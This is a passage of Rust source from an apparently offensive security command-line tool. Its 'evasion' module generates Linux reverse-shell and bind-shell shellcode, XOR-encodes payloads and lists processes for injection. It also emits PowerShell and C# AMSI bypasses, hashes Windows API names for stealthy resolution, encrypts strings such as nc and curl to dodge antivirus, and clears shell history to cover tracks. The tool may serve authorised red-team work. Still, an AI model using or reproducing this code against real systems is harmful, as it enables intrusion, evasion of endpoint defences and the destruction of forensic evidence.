        println!("    Display trait: {}", api_key); // Shows [REDACTED]
        println!("    Debug trait: {:?}", api_key); // Shows VaultEntry([REDACTED N bytes])
    }
    println!();

    // Integrity check
    Output::info("Integrity verification:");
    println!("    All entries intact: {}", vault.verify_integrity());
    println!();

    // Lock/unlock demo
    Output::info("Lock/unlock mechanism:");
    println!("    Locking vault (re-encrypts with new key)...");
    vault.lock();
    println!("    Is locked: {}", vault.is_locked());
    println!(
        "    Access while locked: {:?}",
        vault.get("API_KEY").map(|_| "success").unwrap_or("denied")
    );

    println!("    Unlocking vault...");
    vault.unlock();
    println!("    Is locked: {}", vault.is_locked());
    println!(
        "    Access after unlock: {:?}",
        vault.get("API_KEY").map(|_| "success").unwrap_or("denied")
    );
    println!();

    // Usage example
    Output::info("Usage example:");
    println!();
    println!("    {}let mut vault = SecureVault::new();", GREEN);
    println!("    vault.store(\"API_KEY\", \"sk_live_abc123\");");
    println!("    ");
    println!("    // Access with automatic re-encryption after use");
    println!("    if let Some(key) = vault.get(\"API_KEY\") {{");
    println!("        use_api_key(key.as_str());");
    println!("        // key is automatically zeroed when dropped");
    println!("    }}");
    println!("    ");
    println!("    // Lock vault when not needed");
    println!("    vault.lock();{}", RESET);
    println!();

    Output::success("Vault automatically wiped on drop (emergency_wipe)");

    Ok(())
}

// =============================================================================
// API Hash Command
// =============================================================================

pub struct EvasionApihashCommand;

impl Command for EvasionApihashCommand {
    fn domain(&self) -> &str {
        "evasion"
    }

    fn resource(&self) -> &str {
        "apihash"
    }

    fn description(&self) -> &str {
        "API hashing for dynamic function resolution"
    }

    fn routes(&self) -> Vec<Route> {
        vec![
            Route {
                verb: "hash",
                summary: "Hash an API function name",
                usage: "rb evasion apihash hash <name> [--algo <alg>]",
            },
            Route {
                verb: "list",
                summary: "List pre-computed Windows API hashes",
                usage: "rb evasion apihash list [--dll <name>]",
            },
            Route {
                verb: "syscalls",
                summary: "List Linux syscall numbers",
                usage: "rb evasion apihash syscalls",
            },
        ]
    }

    fn flags(&self) -> Vec<Flag> {
        vec![
            Flag::new("algo", "Hash algorithm (ror13, djb2, fnv1a, crc32)")
                .with_short('a')
                .with_default("ror13"),
            Flag::new("dll", "Filter by DLL name").with_short('d'),
        ]
    }

    fn examples(&self) -> Vec<(&str, &str)> {
        vec![
            ("Hash function name", "rb evasion apihash hash LoadLibraryA"),
            (
                "Use DJB2",
                "rb evasion apihash hash VirtualAlloc --algo djb2",
            ),
            (
                "List kernel32 hashes",
                "rb evasion apihash list --dll kernel32",
            ),
            ("List syscalls", "rb evasion apihash syscalls"),
        ]
    }

    fn execute(&self, ctx: &CliContext) -> Result<(), String> {
        let verb = ctx.verb.as_deref().unwrap_or("hash");

        match verb {
            "hash" => execute_apihash_hash(ctx),
            "list" => execute_apihash_list(ctx),
            "syscalls" => execute_apihash_syscalls(),
            _ => Err(format!("Unknown verb: {}", verb)),
        }
    }
}

fn execute_apihash_hash(ctx: &CliContext) -> Result<(), String> {
    let name = ctx.target.as_ref().ok_or("Missing function name to hash")?;
    let algo = ctx.flags.get("algo").map(|s| s.as_str()).unwrap_or("ror13");

    Output::header("API Hash");
    println!();

    Output::item("Function", name);
    Output::item("Algorithm", algo);

    let hash = match algo {
        "ror13" => api_hash::ror13_hash(name),
        "djb2" => api_hash::djb2_hash(name),
        "fnv1a" => api_hash::fnv1a_hash(name),
        "crc32" => api_hash::crc32_hash(name),
        _ => return Err(format!("Unknown algorithm: {}", algo)),
    };

    Output::item("Hash", &format!("0x{:08X}", hash));

    println!();
    Output::info("All algorithms for comparison:");
    println!("    ROR13:  0x{:08X}", api_hash::ror13_hash(name));
    println!("    DJB2:   0x{:08X}", api_hash::djb2_hash(name));
    println!("    FNV-1a: 0x{:08X}", api_hash::fnv1a_hash(name));
    println!("    CRC32:  0x{:08X}", api_hash::crc32_hash(name));

    Ok(())
}

fn execute_apihash_list(ctx: &CliContext) -> Result<(), String> {
    let dll_filter = ctx.flags.get("dll").map(|s| s.to_lowercase());

    Output::header("Pre-computed API Hashes (ROR13)");
    println!();

    let hashes = api_hash::WindowsApiHashes::new(api_hash::HashAlgorithm::Ror13);

    // kernel32
    if dll_filter.is_none() || dll_filter.as_deref() == Some("kernel32") {
        Output::info("kernel32.dll:");
        if let Some(h) = hashes.get_hash("LoadLibraryA") {
            println!("    LoadLibraryA:      0x{:08X}", h);
        }
        if let Some(h) = hashes.get_hash("GetProcAddress") {
            println!("    GetProcAddress:    0x{:08X}", h);
        }
        if let Some(h) = hashes.get_hash("VirtualAlloc") {
            println!("    VirtualAlloc:      0x{:08X}", h);
        }
        if let Some(h) = hashes.get_hash("VirtualProtect") {
            println!("    VirtualProtect:    0x{:08X}", h);
        }
        if let Some(h) = hashes.get_hash("VirtualFree") {
            println!("    VirtualFree:       0x{:08X}", h);
        }
        if let Some(h) = hashes.get_hash("CreateThread") {
            println!("    CreateThread:      0x{:08X}", h);
        }
        if let Some(h) = hashes.get_hash("WaitForSingleObject") {
            println!("    WaitForSingleObj:  0x{:08X}", h);
        }
        if let Some(h) = hashes.get_hash("CloseHandle") {
            println!("    CloseHandle:       0x{:08X}", h);
        }
        if let Some(h) = hashes.get_hash("GetModuleHandleA") {
            println!("    GetModuleHandleA:  0x{:08X}", h);
        }
        println!();
    }

    // ntdll
    if dll_filter.is_none() || dll_filter.as_deref() == Some("ntdll") {
        Output::info("ntdll.dll:");
        if let Some(h) = hashes.get_hash("NtAllocateVirtualMemory") {
            println!("    NtAllocateVirtualMemory:  0x{:08X}", h);
        }
        if let Some(h) = hashes.get_hash("NtProtectVirtualMemory") {
            println!("    NtProtectVirtualMemory:   0x{:08X}", h);
        }
        if let Some(h) = hashes.get_hash("NtCreateThreadEx") {
            println!("    NtCreateThreadEx:         0x{:08X}", h);
        }
        if let Some(h) = hashes.get_hash("NtWriteVirtualMemory") {
            println!("    NtWriteVirtualMemory:     0x{:08X}", h);
        }
        if let Some(h) = hashes.get_hash("RtlMoveMemory") {
            println!("    RtlMoveMemory:            0x{:08X}", h);
        }
        println!();
    }

    // user32
    if dll_filter.is_none() || dll_filter.as_deref() == Some("user32") {
        Output::info("user32.dll:");
        if let Some(h) = hashes.get_hash("MessageBoxA") {
            println!("    MessageBoxA:  0x{:08X}", h);
        }
        println!();
    }

    // advapi32
    if dll_filter.is_none() || dll_filter.as_deref() == Some("advapi32") {
        Output::info("advapi32.dll:");
        if let Some(h) = hashes.get_hash("OpenProcessToken") {
            println!("    OpenProcessToken:      0x{:08X}", h);
        }
        if let Some(h) = hashes.get_hash("AdjustTokenPrivileges") {
            println!("    AdjustTokenPrivileges: 0x{:08X}", h);
        }
        println!();
    }

    Ok(())
}

fn execute_apihash_syscalls() -> Result<(), String> {
    Output::header("Linux Syscalls (x86_64)");
    println!();

    Output::info("Common Syscalls:");
    println!("    read:       {}", api_hash::LinuxSyscalls::SYS_READ);
    println!("    write:      {}", api_hash::LinuxSyscalls::SYS_WRITE);
    println!("    open:       {}", api_hash::LinuxSyscalls::SYS_OPEN);
    println!("    close:      {}", api_hash::LinuxSyscalls::SYS_CLOSE);
    println!("    mmap:       {}", api_hash::LinuxSyscalls::SYS_MMAP);
    println!("    mprotect:   {}", api_hash::LinuxSyscalls::SYS_MPROTECT);
    println!("    munmap:     {}", api_hash::LinuxSyscalls::SYS_MUNMAP);
    println!("    fork:       {}", api_hash::LinuxSyscalls::SYS_FORK);
    println!("    execve:     {}", api_hash::LinuxSyscalls::SYS_EXECVE);
    println!("    exit:       {}", api_hash::LinuxSyscalls::SYS_EXIT);
    println!("    socket:     {}", api_hash::LinuxSyscalls::SYS_SOCKET);
    println!("    connect:    {}", api_hash::LinuxSyscalls::SYS_CONNECT);
    println!("    bind:       {}", api_hash::LinuxSyscalls::SYS_BIND);
    println!("    listen:     {}", api_hash::LinuxSyscalls::SYS_LISTEN);
    println!("    accept:     {}", api_hash::LinuxSyscalls::SYS_ACCEPT);
    println!("    ptrace:     {}", api_hash::LinuxSyscalls::SYS_PTRACE);
    println!("    clone:      {}", api_hash::LinuxSyscalls::SYS_CLONE);
    println!("    getpid:     {}", api_hash::LinuxSyscalls::SYS_GETPID);
    println!("    getuid:     {}", api_hash::LinuxSyscalls::SYS_GETUID);

    Ok(())
}

// =============================================================================
// Control Flow Command
// =============================================================================

pub struct EvasionControlflowCommand;

impl Command for EvasionControlflowCommand {
    fn domain(&self) -> &str {
        "evasion"
    }

    fn resource(&self) -> &str {
        "controlflow"
    }

    fn description(&self) -> &str {
        "Control flow obfuscation techniques"
    }

    fn routes(&self) -> Vec<Route> {
        vec![
            Route {
                verb: "demo",
                summary: "Demo control flow obfuscation techniques",
                usage: "rb evasion controlflow demo",
            },
            Route {
                verb: "predicates",
                summary: "Show opaque predicate examples",
                usage: "rb evasion controlflow predicates",
            },
            Route {
                verb: "substitute",
                summary: "Show instruction substitution examples",
                usage: "rb evasion controlflow substitute <value>",
            },
        ]
    }

    fn flags(&self) -> Vec<Flag> {
        vec![]
    }

    fn examples(&self) -> Vec<(&str, &str)> {
        vec![
            ("Demo techniques", "rb evasion controlflow demo"),
            ("Show predicates", "rb evasion controlflow predicates"),
            ("Substitute 42", "rb evasion controlflow substitute 42"),
        ]
    }

    fn execute(&self, ctx: &CliContext) -> Result<(), String> {
        let verb = ctx.verb.as_deref().unwrap_or("demo");

        match verb {
            "demo" => execute_controlflow_demo(),
            "predicates" => execute_controlflow_predicates(),
            "substitute" => execute_controlflow_substitute(ctx),
            _ => Err(format!("Unknown verb: {}", verb)),
        }
    }
}

fn execute_controlflow_demo() -> Result<(), String> {
    Output::header("Control Flow Obfuscation Demo");
    println!();

    // Demo opaque predicates
    Output::info("1. Opaque Predicates (always true/false, hard to analyze):");
    println!(
        "    always_true_math(42):   {}",
        control_flow::OpaquePredicates::always_true_math(42)
    );
    println!(
        "    always_true_ptr():      {}",
        control_flow::OpaquePredicates::always_true_ptr()
    );
    println!(
        "    always_true_float():    {}",
        control_flow::OpaquePredicates::always_true_float()
    );
    println!(
        "    always_false_math(42):  {}",
        control_flow::OpaquePredicates::always_false_math(42)
    );
    println!(
        "    always_false_const():   {}",
        control_flow::OpaquePredicates::always_false_const()
    );

    println!();

    // Demo dead code
    Output::info("2. Dead Code Insertion:");
    println!("    fake_crypto_code():  [complex but unused code]");
    println!("    fake_network_code(): [socket-like operations]");
    println!("    fake_file_code():    [file handling stubs]");
    control_flow::DeadCode::insert_all();
    println!("    All blocks contain dead code (never executed)");

    println!();

    // Demo instruction substitution
    Output::info("3. Instruction Substitution:");
    let a = 10u32;
    let b = 5u32;
    println!(
        "    add_substitute({}, {}): {}",
        a,
        b,
        control_flow::InstructionSubstitution::add_substitute(a, b)
    );
    println!(
        "    sub_substitute({}, {}): {}",
        a,
        b,
        control_flow::InstructionSubstitution::sub_substitute(a, b)
    );
    println!(
        "    xor_substitute({}, {}): {}",
        a,
        b,
        control_flow::InstructionSubstitution::xor_substitute(a, b)
    );

    Ok(())
}

fn execute_controlflow_predicates() -> Result<(), String> {
    Output::header("Opaque Predicates");
    println!();

    Output::info("These expressions always evaluate to the same value,");
    Output::info("but are hard for static analysis to determine:");
    println!();

    Output::info("Always True:");
    println!(
        "    always_true_math(seed):   {}",
        control_flow::OpaquePredicates::always_true_math(12345)
    );
    println!(
        "    always_true_ptr():        {}",
        control_flow::OpaquePredicates::always_true_ptr()
    );
    println!(
        "    always_true_time():       {}",
        control_flow::OpaquePredicates::always_true_time()
    );
    println!(
        "    always_true_float():      {}",
        control_flow::OpaquePredicates::always_true_float()
    );

    println!();

    Output::info("Always False:");
    println!(
        "    always_false_math(seed):  {}",
        control_flow::OpaquePredicates::always_false_math(12345)
    );
    println!(
        "    always_false_const():     {}",
        control_flow::OpaquePredicates::always_false_const()
    );

    println!();
    Output::info("Usage: Wrap real code in if(opaque_true(seed)) { ... }");
    Output::info("Static analysis may think the branch is conditional");

    Ok(())
}

fn execute_controlflow_substitute(ctx: &CliContext) -> Result<(), String> {
    let value: u32 = ctx
        .target
        .as_ref()
        .and_then(|s| s.parse().ok())
        .unwrap_or(42);

    Output::header("Instruction Substitution");
    println!();

    let other = 17u32;

    Output::item("Input", &format!("{}", value));
    Output::item("Other", &format!("{}", other));

    println!();
    Output::info("Addition alternatives:");
    println!(
        "    Normal:          {} + {} = {}",
        value,
        other,
        value.wrapping_add(other)
    );
    println!(
        "    add_substitute:  {} + {} = {}",
        value,
        other,
        control_flow::InstructionSubstitution::add_substitute(value, other)
    );

    println!();
    Output::info("Subtraction alternatives:");
    println!(
        "    Normal:          {} - {} = {}",
        value,
        other,
        value.wrapping_sub(other)
    );
    println!(
        "    sub_substitute:  {} - {} = {}",
        value,
        other,
        control_flow::InstructionSubstitution::sub_substitute(value, other)
    );

    println!();
    Output::info("XOR alternatives:");
    println!(
        "    Normal:          {} ^ {} = {}",
        value,
        other,
        value ^ other
    );
    println!(
        "    xor_substitute:  {} ^ {} = {}",
        value,
        other,
        control_flow::InstructionSubstitution::xor_substitute(value, other)
    );

    println!();
    Output::info("Multiplication alternative:");
    println!(
        "    Normal:          {} * {} = {}",
        value,
        other,
        value.wrapping_mul(other)
    );
    println!(
        "    mul_substitute:  {} * {} = {}",
        value,
        other,
        control_flow::InstructionSubstitution::mul_substitute(value, other)
    );

    Ok(())
}

// =============================================================================
// Inject Command
// =============================================================================

pub struct EvasionInjectCommand;

impl Command for EvasionInjectCommand {
    fn domain(&self) -> &str {
        "evasion"
    }

    fn resource(&self) -> &str {
        "inject"
    }

    fn description(&self) -> &str {
        "Process injection and shellcode generation"
    }

    fn routes(&self) -> Vec<Route> {
        vec![
            Route {
                verb: "shellcode",
                summary: "Generate shellcode payload",
                usage: "rb evasion inject shellcode <type> [--ip <ip>] [--port <port>]",
            },
            Route {
                verb: "encode",
                summary: "XOR encode shellcode",
                usage: "rb evasion inject encode <hex> [--key <n>]",
            },
            Route {
                verb: "list",
                summary: "List injectable processes",
                usage: "rb evasion inject list [--filter <name>]",
            },
        ]
    }

    fn flags(&self) -> Vec<Flag> {
        vec![
            Flag::new("ip", "IP address for reverse shell")
                .with_short('i')
                .with_default("127.0.0.1"),
            Flag::new("port", "Port for shell")
                .with_short('p')
                .with_default("4444"),
            Flag::new("key", "XOR encoding key")
                .with_short('k')
                .with_default("0x41"),
            Flag::new("filter", "Filter processes by name").with_short('f'),
        ]
    }

    fn examples(&self) -> Vec<(&str, &str)> {
        vec![
            (
                "Generate execve shellcode",
                "rb evasion inject shellcode shell",
            ),
            (
                "Reverse shell",
                "rb evasion inject shellcode reverse --ip 10.0.0.1 --port 4444",
            ),
            ("Bind shell", "rb evasion inject shellcode bind --port 4444"),
            (
                "Encode shellcode",
                "rb evasion inject encode 4831c050... --key 0x42",
            ),
            ("List processes", "rb evasion inject list"),
        ]
    }

    fn execute(&self, ctx: &CliContext) -> Result<(), String> {
        let verb = ctx.verb.as_deref().unwrap_or("shellcode");

        match verb {
            "shellcode" => execute_inject_shellcode(ctx),
            "encode" => execute_inject_encode(ctx),
            "list" => execute_inject_list(ctx),
            _ => Err(format!("Unknown verb: {}", verb)),
        }
    }
}

fn execute_inject_shellcode(ctx: &CliContext) -> Result<(), String> {
    let shellcode_type = ctx.target.as_deref().unwrap_or("shell");

    let ip_str = ctx
        .flags
        .get("ip")
        .map(|s| s.as_str())
        .unwrap_or("127.0.0.1");
    let port: u16 = ctx
        .flags
        .get("port")
        .and_then(|s| s.parse().ok())
        .unwrap_or(4444);

    Output::header("Shellcode Generator");
    println!();

    let shellcode = match shellcode_type {
        "shell" | "exec" => {
            Output::info("Linux x64 execve(/bin/sh)");
            inject::Shellcode::linux_x64_shell()
        }
        "reverse" | "rev" => {
            // Parse IP address to [u8; 4]
            let parts: Vec<u8> = ip_str.split('.').filter_map(|s| s.parse().ok()).collect();
            if parts.len() != 4 {
                return Err(format!("Invalid IP address: {}", ip_str));
            }
            let ip: [u8; 4] = [parts[0], parts[1], parts[2], parts[3]];
            Output::info(&format!("Linux x64 Reverse Shell to {}:{}", ip_str, port));
            inject::Shellcode::linux_x64_reverse_shell(ip, port)
        }
        "bind" => {
            Output::info(&format!("Linux x64 Bind Shell on port {}", port));
            inject::Shellcode::linux_x64_bind_shell(port)
        }
        _ => {
            return Err(format!(
                "Unknown shellcode type: {}. Use: shell, reverse, bind",
                shellcode_type
            ))
        }
    };

    println!();
    Output::item("Size", &format!("{} bytes", shellcode.len()));
    Output::item("Null-free", &format!("{}", !shellcode.bytes().contains(&0)));

    println!();
    Output::info("Hex:");
    let hex: String = shellcode
        .bytes()
        .iter()
        .map(|b| format!("{:02x}", b))
        .collect();
    // Print in chunks of 32 chars (16 bytes)
    for chunk in hex.as_bytes().chunks(64) {
        println!("    {}", std::str::from_utf8(chunk).unwrap_or(""));
    }

    println!();
    Output::info("C array:");
    println!("    unsigned char shellcode[] = {{");
    for chunk in shellcode.bytes().chunks(12) {
        let line: String = chunk
            .iter()
            .map(|b| format!("0x{:02x}", b))
            .collect::<Vec<_>>()
            .join(", ");
        println!("        {},", line);
    }
    println!("    }};");

    Ok(())
}

fn execute_inject_encode(ctx: &CliContext) -> Result<(), String> {
    let hex_data = ctx
        .target
        .as_ref()
        .ok_or("Missing hex shellcode to encode")?;

    let key: u8 = ctx
        .flags
        .get("key")
        .and_then(|s| {
            if s.starts_with("0x") || s.starts_with("0X") {
                u8::from_str_radix(&s[2..], 16).ok()
            } else {
                s.parse().ok()
            }
        })
        .unwrap_or(0x41);

    Output::header("XOR Encoder");
    println!();

    // Parse hex
    let bytes: Result<Vec<u8>, _> = (0..hex_data.len())
        .step_by(2)
        .map(|i| {
            u8::from_str_radix(
                &hex_data[i..i.min(hex_data.len()) + 2.min(hex_data.len() - i)],
                16,
            )
        })
        .collect();

    let bytes = bytes.map_err(|_| "Invalid hex string")?;

    Output::item("Original size", &format!("{} bytes", bytes.len()));
    Output::item("XOR key", &format!("0x{:02X}", key));

    let mut shellcode = inject::Shellcode::new(bytes, inject::Architecture::current());
    shellcode.xor_encode(key);

    println!();
    Output::info("Encoded:");
    Output::item("Total size", &format!("{} bytes", shellcode.len()));

    let hex: String = shellcode
        .bytes()
        .iter()
        .map(|b| format!("{:02x}", b))
        .collect();
    for chunk in hex.as_bytes().chunks(64) {
        println!("    {}", std::str::from_utf8(chunk).unwrap_or(""));
    }

    println!();
    Output::info("To add decoder stub, use with_xor_decoder()");

    Ok(())
}

fn execute_inject_list(ctx: &CliContext) -> Result<(), String> {
    let filter = ctx.flags.get("filter");

    Output::header("Process List");
    println!();

    let processes = inject::ProcessInjector::list_processes();

    Output::info(&format!("Found {} processes", processes.len()));
    println!();

    println!("    {:>6}  NAME", "PID");
    println!("    {:->6}  {:->30}", "", "");

    let mut count = 0;
    for (pid, name) in &processes {
        if let Some(f) = filter {
            if !name.to_lowercase().contains(&f.to_lowercase()) {
                continue;
            }
        }

        println!("    {:>6}  {}", pid, name);
        count += 1;

        if count >= 50 && filter.is_none() {
            println!(
                "    ... ({} more, use --filter to narrow)",
                processes.len() - 50
            );
            break;
        }
    }

    Ok(())
}

// =============================================================================
// AMSI Command
// =============================================================================

pub struct EvasionAmsiCommand;

impl Command for EvasionAmsiCommand {
    fn domain(&self) -> &str {
        "evasion"
    }

    fn resource(&self) -> &str {
        "amsi"
    }

    fn description(&self) -> &str {
        "AMSI bypass techniques (Windows)"
    }

    fn routes(&self) -> Vec<Route> {
        vec![
            Route {
                verb: "powershell",
                summary: "Generate PowerShell AMSI bypass",
                usage: "rb evasion amsi powershell [--method <m>]",
            },
            Route {
                verb: "csharp",
                summary: "Generate C# AMSI bypass code",
                usage: "rb evasion amsi csharp",
            },
            Route {
                verb: "obfuscated",
                summary: "Generate obfuscated bypass",
                usage: "rb evasion amsi obfuscated",
            },
            Route {
                verb: "providers",
                summary: "List known AMSI provider CLSIDs",
                usage: "rb evasion amsi providers",
            },
        ]
    }

    fn flags(&self) -> Vec<Flag> {
        vec![
            Flag::new("method", "Bypass method (patch, initfailed, context)")
                .with_short('m')
                .with_default("patch"),
        ]
    }

    fn examples(&self) -> Vec<(&str, &str)> {
        vec![
            ("PowerShell bypass", "rb evasion amsi powershell"),
            (
                "Init failed method",
                "rb evasion amsi powershell --method initfailed",
            ),
            ("C# bypass", "rb evasion amsi csharp"),
            ("Obfuscated bypass", "rb evasion amsi obfuscated"),
        ]
    }

    fn execute(&self, ctx: &CliContext) -> Result<(), String> {
        let verb = ctx.verb.as_deref().unwrap_or("powershell");

        match verb {
            "powershell" | "ps" => execute_amsi_powershell(ctx),
            "csharp" | "cs" => execute_amsi_csharp(),
            "obfuscated" | "obf" => execute_amsi_obfuscated(),
            "providers" => execute_amsi_providers(),
            _ => Err(format!("Unknown verb: {}", verb)),
        }
    }
}

fn execute_amsi_powershell(ctx: &CliContext) -> Result<(), String> {
    let method = ctx
        .flags
        .get("method")
        .map(|s| s.as_str())
        .unwrap_or("patch");

    Output::header("PowerShell AMSI Bypass");
    println!();

    let bypass_method = match method {
        "patch" => amsi::AmsiBypassMethod::PatchAmsiScanBuffer,
        "initfailed" | "init" => amsi::AmsiBypassMethod::ForceInitFailed,
        "context" => amsi::AmsiBypassMethod::CorruptContext,
        _ => {
            return Err(format!(
                "Unknown method: {}. Use: patch, initfailed, context",
                method
            ))
        }
    };

    Output::item("Method", &format!("{:?}", bypass_method));
    Output::warning("For authorized penetration testing only!");
    println!();

    let script = amsi::generate_powershell_bypass(bypass_method);
    println!("{}", script);

    Ok(())
}

fn execute_amsi_csharp() -> Result<(), String> {
    Output::header("C# AMSI Bypass");
    println!();

    Output::warning("For authorized penetration testing only!");
    println!();

    let code = amsi::generate_csharp_bypass();
    println!("{}", code);

    Ok(())
}

fn execute_amsi_obfuscated() -> Result<(), String> {
    Output::header("Obfuscated AMSI Bypass");
    println!();

    Output::info("This bypass uses string concatenation to avoid signatures");
    Output::warning("For authorized penetration testing only!");
    println!();

    let script = amsi::generate_obfuscated_bypass();
    println!("{}", script);

    Ok(())
}

fn execute_amsi_providers() -> Result<(), String> {
    Output::header("AMSI Provider CLSIDs");
    println!();

    Output::info("Known AMSI providers:");
    println!();

    for clsid in amsi::amsi_provider_clsids() {
        println!("    {}", clsid);
    }

    println!();
    Output::info("These CLSIDs are registered in:");
    println!("    HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers\\");

    Ok(())
}

// =============================================================================
// Strings Command
// =============================================================================

pub struct EvasionStringsCommand;

impl Command for EvasionStringsCommand {
    fn domain(&self) -> &str {
        "evasion"
    }

    fn resource(&self) -> &str {
        "strings"
    }

    fn description(&self) -> &str {
        "Compile-time string encryption"
    }

    fn routes(&self) -> Vec<Route> {
        vec![
            Route {
                verb: "encrypt",
                summary: "Encrypt a string (compile-time style)",
                usage: "rb evasion strings encrypt <string> [--key <n>]",
            },
            Route {
                verb: "sensitive",
                summary: "Show pre-encrypted sensitive strings",
                usage: "rb evasion strings sensitive",
            },
            Route {
                verb: "demo",
                summary: "Demo string encryption types",
                usage: "rb evasion strings demo",
            },
        ]
    }

    fn flags(&self) -> Vec<Flag> {
        vec![Flag::new("key", "Encryption key (0-255)")
            .with_short('k')
            .with_default("0x5A")]
    }

    fn examples(&self) -> Vec<(&str, &str)> {
        vec![
            ("Encrypt string", "rb evasion strings encrypt \"cmd.exe\""),
            ("Show sensitive", "rb evasion strings sensitive"),
            ("Demo types", "rb evasion strings demo"),
        ]
    }

    fn execute(&self, ctx: &CliContext) -> Result<(), String> {
        let verb = ctx.verb.as_deref().unwrap_or("encrypt");

        match verb {
            "encrypt" => execute_strings_encrypt(ctx),
            "sensitive" => execute_strings_sensitive(),
            "demo" => execute_strings_demo(),
            _ => Err(format!("Unknown verb: {}", verb)),
        }
    }
}

fn execute_strings_encrypt(ctx: &CliContext) -> Result<(), String> {
    let data = ctx.target.as_ref().ok_or("Missing string to encrypt")?;

    let key: u8 = ctx
        .flags
        .get("key")
        .and_then(|s| {
            if s.starts_with("0x") || s.starts_with("0X") {
                u8::from_str_radix(&s[2..], 16).ok()
            } else {
                s.parse().ok()
            }
        })
        .unwrap_or(0x5A);

    Output::header("String Encryption");
    println!();

    // Encrypt the plaintext manually
    let encrypted_bytes: Vec<u8> = data.bytes().map(|b| b ^ key).collect();
    let encrypted = strings::EncryptedString::new(&encrypted_bytes, key);

    Output::item("Original", data);
    Output::item("Key", &format!("0x{:02X}", key));

    let hex: String = encrypted
        .encrypted_bytes()
        .iter()
        .map(|b| format!("{:02x}", b))
        .collect();
    Output::item("Encrypted (hex)", &hex);

    let recovered = encrypted.decrypt();
    Output::item("Decrypted", &recovered);

    println!();
    Output::info("Rust code to embed:");
    println!(
        "    const ENCRYPTED: &[u8] = &[{}];",
        encrypted
            .encrypted_bytes()
            .iter()
            .map(|b| format!("0x{:02x}", b))
            .collect::<Vec<_>>()
            .join(", ")
    );
    println!("    const KEY: u8 = 0x{:02X};", key);
    println!("    let s = EncryptedString::new(ENCRYPTED, KEY).decrypt();");

    Ok(())
}

fn execute_strings_sensitive() -> Result<(), String> {
    Output::header("Pre-Encrypted Sensitive Strings");
    println!();

    Output::info("Common strings that would trigger AV if plaintext:");
    println!();

    println!(
        "    cmd_exe:         \"{}\"",
        strings::SensitiveStrings::cmd_exe().decrypt_with_build_key()
    );
    println!(
        "    powershell:      \"{}\"",
        strings::SensitiveStrings::powershell().decrypt_with_build_key()
    );
    println!(
        "    bash:            \"{}\"",
        strings::SensitiveStrings::bash().decrypt_with_build_key()
    );
    println!(
        "    sh:              \"{}\"",
        strings::SensitiveStrings::sh().decrypt_with_build_key()
    );
    println!(
        "    nc:              \"{}\"",
        strings::SensitiveStrings::nc().decrypt_with_build_key()
    );
    println!(
        "    curl:            \"{}\"",
        strings::SensitiveStrings::curl().decrypt_with_build_key()
    );
    println!(
        "    wget:            \"{}\"",
        strings::SensitiveStrings::wget().decrypt_with_build_key()
    );

    println!();
    Output::info("These strings are stored encrypted and only decrypted at runtime");

    Ok(())
}

fn execute_strings_demo() -> Result<(), String> {
    Output::header("String Encryption Types");
    println!();

    // EncryptedString
    Output::info("1. EncryptedString (heap allocated):");
    let es = strings::EncryptedString::from_plaintext("password123");
    println!("    Original:  password123");
    println!("    Decrypted: {}", es.decrypt_with_build_key());
    println!("    Storage:   Heap (Vec<u8>)");

    println!();

    // StackString
    Output::info("2. StackString (stack allocated):");
    let ss = strings::StackString::new("secret_key");
    println!("    Original:  secret_key");
    println!("    Decrypted: {}", ss.decrypt());
    println!("    Storage:   Stack (encrypted on create)");

    println!();

    // SecureString
    Output::info("3. SecureString (zeroed on drop):");
    let secure = strings::SecureString::new("api_token_xyz");
    println!("    Original:  api_token_xyz");
    println!("    Value:     {}", secure.as_str());
    println!("    Storage:   Heap, zeroed on drop");

    println!();
    Output::success("All strings are XOR encrypted in memory");

    Ok(())
}

// =============================================================================
// Tracks Command (History Clearing)
// =============================================================================

pub struct EvasionTracksCommand;

impl Command for EvasionTracksCommand {
    fn domain(&self) -> &str {
        "evasion"
    }

    fn resource(&self) -> &str {
        "tracks"
    }

    fn description(&self) -> &str {
        "Track covering and history clearing for operational security"
    }

    fn routes(&self) -> Vec<Route> {
        vec![
            Route {
                verb: "scan",
                summary: "Scan for history files without clearing",
                usage: "rb evasion tracks scan",
            },
            Route {
                verb: "clear",
                summary: "Clear all shell history files",
                usage: "rb evasion tracks clear [--secure] [--shell <name>]",
            },
            Route {
                verb: "sessions",
                summary: "Clear redblue session files",
                usage: "rb evasion tracks sessions",
            },
            Route {
                verb: "command",
                summary: "Show shell command to clear current session",
                usage: "rb evasion tracks command [--shell <name>]",
            },
        ]
    }

    fn flags(&self) -> Vec<Flag> {
        vec![
            Flag::new("secure", "Overwrite files before clearing (zeros + random)"),
            Flag::new("shell", "Target specific shell (bash, zsh, fish)")
                .with_short('s')
                .with_arg("NAME"),
        ]
    }

    fn examples(&self) -> Vec<(&str, &str)> {
        vec![
            ("Scan for history files", "rb evasion tracks scan"),
            ("Clear all history", "rb evasion tracks clear"),
            ("Secure wipe history", "rb evasion tracks clear --secure"),
            (
                "Clear only bash history",
                "rb evasion tracks clear --shell bash",
            ),
            ("Clear rb sessions", "rb evasion tracks sessions"),
            ("Get clear command", "rb evasion tracks command"),
        ]
    }

    fn execute(&self, ctx: &CliContext) -> Result<(), String> {
        let verb = ctx.verb.as_deref().unwrap_or("scan");

        match verb {
            "scan" => execute_tracks_scan(),
            "clear" => execute_tracks_clear(ctx),
            "sessions" => execute_tracks_sessions(),
            "command" | "cmd" => execute_tracks_command(ctx),
            _ => Err(format!("Unknown verb: {}", verb)),
        }
    }
}

fn execute_tracks_scan() -> Result<(), String> {
    Output::header("Track Scanner");
    println!();

    Output::spinner_start("Scanning for history files");

    let stats = tracks::ClearStats::gather();

    Output::spinner_done();
    println!();

    Output::info("History Files Found:");
    let files = tracks::HistoryFiles::detect();

    if !files.bash.is_empty() {
        println!(
            "    {} Bash history files:",
            colored(&files.bash.len().to_string(), YELLOW)
        );
        for f in &files.bash {
            let size = std::fs::metadata(f).map(|m| m.len()).unwrap_or(0);
            println!("        {} ({} bytes)", f.display(), size);
        }
    }

    if !files.zsh.is_empty() {
        println!(
            "    {} Zsh history files:",
            colored(&files.zsh.len().to_string(), YELLOW)
        );
        for f in &files.zsh {
            let size = std::fs::metadata(f).map(|m| m.len()).unwrap_or(0);
            println!("        {} ({} bytes)", f.display(), size);
        }
    }

    if !files.fish.is_empty() {
        println!(
            "    {} Fish history files:",
            colored(&files.fish.len().to_string(), YELLOW)
        );
        for f in &files.fish {
            let size = std::fs::metadata(f).map(|m| m.len()).unwrap_or(0);
            println!("        {} ({} bytes)", f.display(), size);
        }
    }

    if !files.other.is_empty() {
        println!(
            "    {} Other shell history files:",
